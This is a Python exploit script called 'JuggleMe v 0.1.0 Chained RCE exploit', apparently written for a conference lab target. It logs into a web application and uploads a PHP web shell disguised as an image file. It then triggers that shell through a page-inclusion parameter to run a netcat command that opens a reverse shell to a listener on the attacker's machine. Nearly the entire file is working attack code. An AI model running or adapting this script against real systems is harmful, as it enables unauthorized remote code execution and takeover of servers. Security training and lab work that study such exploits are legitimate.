#!/usr/bin/python
import sys
import argparse
import pyfiglet
import requests
import time
import subprocess
proxies={
'http':'http://127.0.0.1:8081'
}
banner = pyfiglet.figlet_format("Optiv Source Zero Con")
print(banner)
print('Chained RCE exploit')
print('JuggleMe v 0.1.0')

uploaded_file = "shell.php.png"
files = {'image':(uploaded_file, "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd =($_REQUEST['cmd']);system($cmd);echo \"</pre>\";die;}?>")
	}

class Exploit:

	def __init__(self, target_ip, target_port, localhost, localport, login, password):
		self.target_ip = target_ip
		self.target_port = target_port
		self.localhost = localhost
		self.localport = localport
		self.login = login
		self.password = password

	def exploitation(self):
		#Login and sign in, followed by uploading a file and navigating to it.
		url = "http://" + target_ip + ":" + target_port
		r = requests.Session()
		print("[*] Resolving URL...")
		r1 = r.get(url)
		time.sleep(3)
		print("[*] Logging in to application...")
		login_data={
				"user":login,
				"pass":password,
				"login":"LOGIN"
			}
		r2 = r.post(url + "/Login.php", data=login_data)
		if (r2.status_code == 200):
			print('[*] Login successful! Proceeding...')
		else:
			print('[*] Something went wrong!')
			quit()
		r3 = r.post(url +"/home.php", files=files, proxies=proxies)
		time.sleep(3)
		if (r3.status_code == 200):
			print('[*] Upload Successful! Proceeding...')
		else:
			print('[*] Something went Wrong!')
			quit()
		time.sleep(3)

		#netcat listener
		print("[*] Setting up a netcat listener")
		listener = subprocess.Popen(["nc", "-nvlp", self.localport])
		time.sleep(3)

		#exec the payload
		print("[*] Executing reverse shell payload")
		print("[*] Watchout for shell! :)")
		r5 = r.get(url + "/home.php?page=shell.php.png&cmd=nc -c /bin/bash """ + localhost + """ """ + localport)
		listener.wait()

		if (r5.status_code == 200):
			print("[*] It worked!")
			listener.wait()
		else:
			print("[!] Something went wrong!")
			listener.terminate()

def get_args():
	parser = argparse.ArgumentParser(description='JuggleMe v 0.1.0 - Remote Code Execution (RCE) (Authenticated)')
	parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target IP')
	parser.add_argument('-p', '--port', dest="target_port", required=True, action='store', help='Target port')
	parser.add_argument('-L', '--lh', dest="localhost", required=True, action='store', help='Listening IP')
	parser.add_argument('-P', '--lp', dest="localport", required=True, action='store', help='Listening port')
	parser.add_argument('-pa', '--pass', dest="password", required=True, action='store', help='password')
	parser.add_argument('-l', '--login', dest="login", required=True, action='store', help='User login')
	
	
	args = parser.parse_args()
	return args

args = get_args()
target_ip = args.url
target_port = args.target_port
localhost = args.localhost
localport = args.localport
login = args.login
password = args.password

exp = Exploit(target_ip, target_port, localhost, localport, login, password)
exp.exploitation()
 
